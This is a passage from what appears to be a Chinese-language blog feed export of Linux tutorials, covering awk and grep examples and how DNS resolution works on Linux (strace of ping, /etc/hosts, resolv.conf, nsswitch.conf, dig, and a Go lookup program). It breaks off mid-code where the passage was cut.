<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>《Linux 的启动过程》，白崎博生，2004 （暂无中文版）</li>
<li>《深入理解 Linux 内核》，Daniel P.Bovert （经典）</li>
<li><a href="https://www.ibm.com/developerworks/library/l-linuxboot/">Inside the Linux boot process</a></li>
<li><a href="http://www.linfo.org/root_filesystem.html">linfo.org:Root Filesystem Definition</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html">阮一峰：Systemd 入门教程：命令篇</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html">阮一峰：Systemd 入门教程：实战篇</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/1407_liuming_init3/">IBM developerworks:浅析 Linux 初始化 init 系统，第 3 部分: Systemd</a></li>
<li><a href="https://zh.wikipedia.org/wiki/Systemd">维基百科：Systemd</a></li>
<li><a href="http://www.jamescoyle.net/knowladge/951-the-difference-between-a-tmpfs-and-ramfs-ram-disk">differences between ramfs and tmpfs</a></li>
<li><a href="http://sirupsen.com/unix-background-queue/">Unix Background (Signal、Messages &amp; Queue) | Simon Hørup Eskildsen</a></li>
<li><a href="http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory/">(推荐) How the Kernel Manages Your Memory | Gustavo Duarte </a></li>
<li><a href="http://duartes.org/gustavo/blog/post/what-your-computer-does-while-you-wait/">(推荐) What Your Computer Does While You Wait | Gustavo Duarte </a></li>
<li><a href="http://duartes.org/gustavo/blog/post/what-does-an-idle-cpu-do/">(推荐) What Does an Idle CPU Do? | Gustavo Duarte </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works：Shell 编程</title>
    <url>/2019/05/12/Linux-Shell/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Overview</li>
<li>BASIC</li>
<li>key words:echo、grep、awk、xargs</li>
<li>functions &amp; parameters</li>
<li>user environment: crontabs</li>
<li>concurrent: threads</li>
<li>Application</li>
</ul>
<a id="more"></a>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h3 id="When-to-Use-Shell-Scripts"><a href="#When-to-Use-Shell-Scripts" class="headerlink" title="When to Use Shell Scripts"></a>When to Use Shell Scripts</h3><h2 id="Shell-Script-Basics"><a href="#Shell-Script-Basics" class="headerlink" title="Shell Script Basics"></a>Shell Script Basics</h2><p><img src="https://blog.flowblok.id.au/static/images/shell-startup.png" alt="shell-startup"></p>
<h3 id="User-Environments"><a href="#User-Environments" class="headerlink" title="User Environments"></a>User Environments</h3><h3 id="Key-Words"><a href="#Key-Words" class="headerlink" title="Key Words"></a>Key Words</h3><h4 id="Echo"><a href="#Echo" class="headerlink" title="Echo"></a>Echo</h4><ul>
<li><a href="https://github.com/learnbyexample/Command-line-text-processing/blob/master/gnu_awk.md" target="_blank" rel="noopener">Command-line-text-processing</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">'foo:123:bar:789'</span> | awk -F: <span class="string">'&#123;print $2,$3&#125;'</span></span><br><span class="line">123 bar</span><br><span class="line"></span><br><span class="line">$ <span class="comment"># second field where input field separator is :</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'foo:123:bar:789'</span> | awk -F: <span class="string">'&#123;print $2&#125;'</span></span><br><span class="line">123</span><br><span class="line"></span><br><span class="line">$ <span class="comment"># last field</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'foo:123:bar:789'</span> | awk -F: <span class="string">'&#123;print $NF&#125;'</span></span><br><span class="line">789</span><br><span class="line"></span><br><span class="line">$ <span class="comment"># first and last field</span></span><br><span class="line">$ <span class="comment"># note the use of , and space between output fields</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'foo:123:bar:789'</span> | awk -F: <span class="string">'&#123;print $1, $NF&#125;'</span></span><br><span class="line">foo 789</span><br><span class="line"></span><br><span class="line">$ <span class="comment"># second last field</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'foo:123:bar:789'</span> | awk -F: <span class="string">'&#123;print $(NF-1)&#125;'</span></span><br><span class="line">bar</span><br><span class="line"></span><br><span class="line">$ <span class="comment"># use quotes to avoid clashes with shell special characters</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'one;two;three;four'</span> | awk -F<span class="string">';'</span> <span class="string">'&#123;print $3&#125;'</span></span><br><span class="line">three</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'Sample123string54with908numbers'</span> | awk -F<span class="string">'[0-9]+'</span> <span class="string">'&#123;print $2&#125;'</span></span><br><span class="line">string</span><br></pre></td></tr></table></figure>
<h4 id="Grep"><a href="#Grep" class="headerlink" title="Grep"></a>Grep</h4><h4 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h4><h4 id="Xargs"><a href="#Xargs" class="headerlink" title="Xargs"></a>Xargs</h4><h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><h4 id="文本查找"><a href="#文本查找" class="headerlink" title="文本查找"></a>文本查找</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -rn <span class="string">"Hello"</span> *</span><br></pre></td></tr></table></figure>
<h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf" target="_blank" rel="noopener">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details" target="_blank" rel="noopener">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd" target="_blank" rel="noopener">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://ferd.ca/awk-in-20-minutes.html" target="_blank" rel="noopener">AWK in 20 minutes</a></li>
<li><a href="https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/" target="_blank" rel="noopener">Ten Things I Wish I’d Known About bash</a></li>
<li><a href="https://linuxize.com/post/echo-command-in-linux-with-examples/" target="_blank" rel="noopener">Echo Command in Linux with Examples</a></li>
<li><a href="https://blog.flowblok.id.au/2013-02/shell-startup-scripts.html" target="_blank" rel="noopener">Shell startup scripts</a></li>
<li><a href="https://www.putorius.net/linux-io-file-descriptors-and-redirection.html" target="_blank" rel="noopener">Introduction to Linux IO, Standard Streams, and Redirection.</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works:Network</title>
    <url>/2018/01/08/Linux-Works-Network/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、How DNS Works</li>
<li>二、How Route Works</li>
<li>三、How ARP Works</li>
</ul>
<span id="more"></span>
<h2 id="How-DNS-Works"><a href="#How-DNS-Works" class="headerlink" title="How DNS Works"></a>How DNS Works</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-DNS-Overview.png" alt="Overview"></p>
<p>域名系统（Domain Name System，DNS）将域名和 IP 地址相互映射，能够使人更方便地访问互联网。DNS 最早于 1983 年由保罗·莫卡派乔斯（Paul Mockapetris）发明（RFC 882，RFC 883），1987年发布了修正（RFC 1034，RFC 1035），在此之后 DNS 技术基本上没有改动。</p>
<p>DNS 协议使用端口 53 ，同时兼容 TCP (RFC-793) 和 UDP(RFC-768) ，但是考虑到更低的开销及性能，DNS 查询通常使用 UDP 协议。DNS 消息包括请求和响应两部分, 所有报文包含标题和其他片断 (例如 question 和 RR ，取决于报文类型)。</p>
<ul>
<li>DNS Message - Header: 给出语义的上下文，包括查询个数、结果个数、 会话 ID 等</li>
<li>DNS Message - Question: 包含要针对 nameserver 执行的查询</li>
<li>DNS Message - RR: 包装格式相同, 可以根据类型分析字段 (RDATA)</li>
</ul>
<blockquote>
<p>The DNS assumes that messages will be transmitted as datagrams or in a byte stream carried by a virtual circuit. While virtual circuits can be used for any DNS activity, datagrams are preferred for queries due to their lower overhead and better performance.  — 《<a href="https://tools.ietf.org/html/rfc1035">RFC-1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION</a>》</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DNS_Package_Message.jpeg" alt=""></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ping</span> baidu.com | head -1</span><br><span class="line">PING baidu.com (220.181.57.216) 56(84) bytes of data.</span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span> baidu.com</span><br><span class="line">baidu.com has address 220.181.57.216</span><br><span class="line">baidu.com has address 123.125.115.110</span><br></pre></td></tr></table></figure>
<h4 id="unknown-host"><a href="#unknown-host" class="headerlink" title="unknown host"></a>unknown host</h4><p><strong>strace</strong> 是 Linux 环境下的一款程序调试工具，用来监视一个应用程序所使用的系统调用及它所接收的系统信息。借助 strace 我们可以更好地理解 DNS 工作原理。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ping</span> baidu.com</span><br><span class="line">ping: unknown host baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># strace -e trace=open -f ping -c1 baidu.com</span></span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">open(<span class="string">&quot;/lib64/libcap.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">open(<span class="string">&quot;/lib64/libidn.so.11&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">open(<span class="string">&quot;/lib64/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">open(<span class="string">&quot;/lib64/libattr.so.1&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">open(<span class="string">&quot;/usr/lib/locale/locale-archive&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">open(<span class="string">&quot;/etc/resolv.conf&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/etc/nsswitch.conf&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/lib64/libnss_files.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/etc/host.conf&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/etc/hosts&quot;</span>, O_RDONLY|O_CLOEXEC)  = 4</span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/lib64/libnss_dns.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">open(<span class="string">&quot;/lib64/libresolv.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line">ping: unknown host baidu.com</span><br><span class="line">+++ exited with 2 +++</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Works-DNS-NSSwitch.png" alt="NSSwitch"></p>
<h4 id="hosts-static-table-lookup-for-hostnames"><a href="#hosts-static-table-lookup-for-hostnames" class="headerlink" title="hosts - static table lookup for hostnames"></a>hosts - static table lookup for hostnames</h4><p><strong>/etc/hosts</strong> 主机名查询静态表；主要用于IP地址与计算机主机名之间的转换。与 /etc/resolv.conf 的区别是，用户可以直接对 hosts 文件进行控制。一般情况下，我们主要通过 DNS 自动提供动态的主机名解析。不过 hosts 文件仍然是一个可以作为备用手段。</p>
<ul>
<li>【IPv4】 127.0.0.1       localhost</li>
<li>【FQDN】 192.168.1.10    foo.mydomain.org   foo</li>
<li>【FQDN】 209.237.226.90  www.opensource.org</li>
<li>【IPv6】 ::1    localhost ip6-localhost ip6-loopback</li>
<li>【IPv6】 ff02::1   ip6-allnodes</li>
<li>【IPv6】 ff02::2   ip6-allrouters</li>
</ul>
<h4 id="etc-resolv-conf"><a href="#etc-resolv-conf" class="headerlink" title="/etc/resolv.conf"></a>/etc/resolv.conf</h4><p><strong>/etc/resolv.conf</strong> DNS 客户机配置文件，用于设置 DNS 服务器的 IP 地址及 DNS 域名，还包含了主机的域名搜索顺序。</p>
<p>值得注意的是，许多程序能够覆盖 /etc/resolv.conf 里的内容（例如 dhcpcd, NetworkManager ），但是有些时候我们希望能够手动设定 DNS 设置(比如使用静态IP时)，可以参考以下几种方法：</p>
<ul>
<li>修改 dhcpcd 配置，echo “nohook resolv.conf” &gt;  /etc/dhcpcd.conf</li>
<li>创建 resolv.conf.head ，dhcpcd将把这个文件插入到 /etc/resolv.conf 文件头.</li>
<li>写保护 /etc/resolv.conf，chattr +i /etc/resolv.conf</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vi /etc/resolv.conf</span></span><br><span class="line">nameserver 1.1.1.1</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># strace -e trace=open -f ping -c1 baidu.com</span></span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libcap.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libidn.so.11&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libattr.so.1&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">open(<span class="string">&quot;/usr/lib/locale/locale-archive&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">open(<span class="string">&quot;/etc/resolv.conf&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/etc/nsswitch.conf&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libnss_files.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/etc/host.conf&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/etc/hosts&quot;</span>, O_RDONLY|O_CLOEXEC)  = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libnss_dns.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">open(<span class="string">&quot;/lib64/libresolv.so.2&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">4</span></span><br><span class="line">PING baidu.com (<span class="number">220.181</span><span class="number">.57</span><span class="number">.216</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line">open(<span class="string">&quot;/etc/hosts&quot;</span>, O_RDONLY|O_CLOEXEC)  = <span class="number">4</span></span><br><span class="line"><span class="number">64</span> bytes from <span class="number">220.181</span><span class="number">.57</span><span class="number">.216</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">174</span> ms</span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line"><span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, time <span class="number">0</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">174.062</span>/<span class="number">174.062</span>/<span class="number">174.062</span>/<span class="number">0.000</span> ms</span><br><span class="line">+++ exited with <span class="number">0</span> +++</span><br></pre></td></tr></table></figure>
<h4 id="NSSwitch"><a href="#NSSwitch" class="headerlink" title="NSSwitch"></a>NSSwitch</h4><p><strong>nsswitch.conf</strong>（name services switch）是 SUN 公司开发的一种扩展。每一行都标识特定类型的网络信息（如主机、口令和组）以及信息源（如 NIS+ 表、NIS 映射、DNS 主机表或本地 /etc）。</p>
<blockquote>
<p>NSSwitch is not just for DNS lookups. It’s also used for passwords and user lookup information.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Works-DNS-Call.png" alt=""></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># more /etc/nsswitch.conf</span></span><br><span class="line">passwd:     files sss</span><br><span class="line">shadow:     files sss</span><br><span class="line">group:      files sss</span><br><span class="line">hosts:      files dns</span><br><span class="line">bootparams: nisplus [NOTFOUND=<span class="built_in">return</span>] files</span><br><span class="line">ethers:     files</span><br><span class="line">netmasks:   files</span><br><span class="line">networks:   files</span><br><span class="line">protocols:  files</span><br><span class="line">rpc:        files</span><br><span class="line">services:   files sss</span><br><span class="line">netgroup:   files sss</span><br><span class="line">publickey:  nisplus</span><br><span class="line">automount:  files sss</span><br><span class="line">aliases:    files nisplus</span><br></pre></td></tr></table></figure>
<h4 id="dig-Domain-Information-Groper"><a href="#dig-Domain-Information-Groper" class="headerlink" title="dig | Domain Information Groper"></a>dig | Domain Information Groper</h4><p><strong>dig</strong>（Domain Information Groper，域信息搜索器）命令是一个用于查询 DNS 的工具。dig 总共有42个查询选项，涉及到 DNS 信息的方方面面，在 DNS 问题诊断时可以将整个过程信息输出。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dig +nocmd google.com  输出过滤版本信息</span><br><span class="line">dig +short google.com  输出最精简的CNAME信息和A记录</span><br><span class="line">dig +nostat google.com 输出过滤统计信息</span><br><span class="line">dig +trace google.com 输出跟踪，从根域查询直到最终结果</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dig +short google.com</span></span><br><span class="line">74.125.130.102</span><br><span class="line">74.125.130.139</span><br><span class="line">74.125.130.138</span><br><span class="line">74.125.130.100</span><br><span class="line">74.125.130.101</span><br><span class="line">74.125.130.113</span><br><span class="line"></span><br><span class="line"><span class="comment"># dig +trace google.com</span></span><br><span class="line">DiG 9.9.4-RedHat-9.9.4-18.el7  +trace google.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.			5	IN	NS	a.root-servers.net.</span><br><span class="line">.			5	IN	NS	b.root-servers.net.</span><br><span class="line">.			5	IN	NS	c.root-servers.net.</span><br><span class="line">.			5	IN	NS	d.root-servers.net.</span><br><span class="line">.			5	IN	NS	e.root-servers.net.</span><br><span class="line">.			5	IN	NS	f.root-servers.net.</span><br><span class="line">.			5	IN	NS	g.root-servers.net.</span><br><span class="line">.			5	IN	NS	h.root-servers.net.</span><br><span class="line">.			5	IN	NS	i.root-servers.net.</span><br><span class="line">.			5	IN	NS	j.root-servers.net.</span><br><span class="line">.			5	IN	NS	k.root-servers.net.</span><br><span class="line">.			5	IN	NS	l.root-servers.net.</span><br><span class="line">.			5	IN	NS	m.root-servers.net.</span><br><span class="line">.			5	IN	RRSIG	NS 8 0 518400 20180803170000 20180721160000 41656 .</span><br><span class="line">.....</span><br><span class="line">;; Received 717 bytes from 192.168.213.2<span class="comment">#53(192.168.213.2) in 10120 ms</span></span><br><span class="line">com.			172800	IN	NS	g.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	j.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	f.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	h.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	b.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	d.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	i.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	m.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	a.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	l.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	c.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	k.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	e.gtld-servers.net.</span><br><span class="line">com.			86400	IN	DS	30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766</span><br><span class="line">com.			86400	IN	RRSIG	DS 8 1 86400 20180804050000 20180722040000 41656 .</span><br><span class="line">.....</span><br><span class="line">;; Received 1170 bytes from 192.36.148.17<span class="comment">#53(i.root-servers.net) in 10405 ms</span></span><br><span class="line">google.com.		172800	IN	NS	ns2.google.com.</span><br><span class="line">google.com.		172800	IN	NS	ns1.google.com.</span><br><span class="line">google.com.		172800	IN	NS	ns3.google.com.</span><br><span class="line">google.com.		172800	IN	NS	ns4.google.com.</span><br><span class="line">.....</span><br><span class="line">;; Received 772 bytes from 192.26.92.30<span class="comment">#53(c.gtld-servers.net) in 4914 ms</span></span><br><span class="line">google.com.		300	IN	A	172.217.31.238</span><br><span class="line">;; Received 44 bytes from 216.239.36.10<span class="comment">#53(ns3.google.com) in 1003 ms</span></span><br></pre></td></tr></table></figure>
<h4 id="DNS-Coding-API"><a href="#DNS-Coding-API" class="headerlink" title="DNS Coding API"></a>DNS Coding API</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	query(<span class="string">&quot;riboseyim.com&quot;</span>)</span><br><span class="line">	query(<span class="string">&quot;qq.com&quot;</span>)</span><br><span class="line">	query(<span class="string">&quot;facebook.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">	host := <span class="string">&quot;riboseyim-qiniu.riboseyim.com&quot;</span></span><br><span class="line">	cname, _ := net.LookupCNAME(host)</span><br><span class="line">	fmt.Println(<span class="string">&quot;CNAME(域名),host&quot;</span>, host, <span class="string">&quot;cname&quot;</span>, cname)</span><br><span class="line"></span><br><span class="line">	server_ip := <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">	ptr, _ := net.LookupAddr(server_ip)</span><br><span class="line">	<span class="keyword">for</span> _, ptrvalue := <span class="keyword">range</span> ptr &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;PTR(指针，IP地址的别名),server_ip&quot;</span>, server_ip, <span class="string">&quot;ptrvalue&quot;</span>, ptrvalue)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">query</span><span class="params">(domain <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	iprecords, _ := net.LookupIP(domain)</span><br><span class="line">	<span class="keyword">for</span> _, ip := <span class="keyword">range</span> iprecords &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;A(主机地址),domain&quot;</span>, domain, <span class="string">&quot;ip&quot;</span>, ip)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nameserver, _ := net.LookupNS(domain)</span><br><span class="line">	<span class="keyword">for</span> _, ns := <span class="keyword">range</span> nameserver &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;NS(域名服务器),domain&quot;</span>, domain, <span class="string">&quot;nameserver&quot;</span>, ns)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mxrecords, _ := net.LookupMX(domain)</span><br><span class="line">	<span class="keyword">for</span> _, mx := <span class="keyword">range</span> mxrecords &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;MX(邮件交换),domain&quot;</span>, domain, <span class="string">&quot;mx.host&quot;</span>, mx.Host, <span class="string">&quot;mx.pref&quot;</span>, mx.Pref)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	txtrecords, _ := net.LookupTXT(domain)</span><br><span 